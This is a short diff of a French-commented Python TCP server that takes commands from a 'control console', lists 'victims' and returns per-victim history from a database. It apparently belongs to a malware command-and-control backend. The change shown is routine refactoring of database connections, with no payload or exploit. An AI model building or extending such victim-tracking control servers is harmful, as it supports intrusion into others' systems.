@@ -99,15 +99,18 @@ class server_tcp(object):
         """
         Système de gestion des commandes envoyées par la console de contrôle
         """
+        conn = udata.connect_db()
         if msg == message.list_victim_req():
-            # On va interroger le serveur SQL depuis le serveur frontale pour des raisons
+            # On va interroger le serveur SQL depuis le serveur frontal pour des raisons
             # De sécurité...
             # On envoie la liste
-            return udata.list_victim()
+            listing = udata.list_victims(conn)
+            conn.close()
+            return str(listing)
         elif "HIST_REQ" in msg:
             # On demande un ID en particulier pour une recherche d'historique
             # On envoie l'historique
-            return udata.history_req(msg[-3:-2])
+            return udata.history_req(conn, msg[-3:-2])
         elif msg == '3':
             # C'est à faire
             return "Todo3"
